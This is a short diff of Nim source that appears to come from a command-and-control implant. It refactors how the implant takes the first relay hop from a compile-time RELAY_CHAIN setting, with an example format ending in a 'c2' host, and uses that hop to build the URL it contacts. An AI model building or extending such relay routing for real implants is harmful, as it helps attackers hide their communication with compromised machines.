@@ -77,10 +77,8 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
             const RELAY_CHAIN {.strdefine.}: string = ""
             when RELAY_CHAIN != "":
                 # Extract first hop from RELAY_CHAIN (format: "relay1:8080,relay2:8080,c2:5000")
-                let firstHop = if RELAY_CHAIN.contains(","): 
-                    RELAY_CHAIN.split(",")[0] 
-                else: 
-                    RELAY_CHAIN
+                const relayChainParts = RELAY_CHAIN.split(",")
+                const firstHop = relayChainParts[0]
                 
                 # Build target URL with first relay hop
                 target = toLowerAscii(li.listenerType) & "://" & firstHop & path
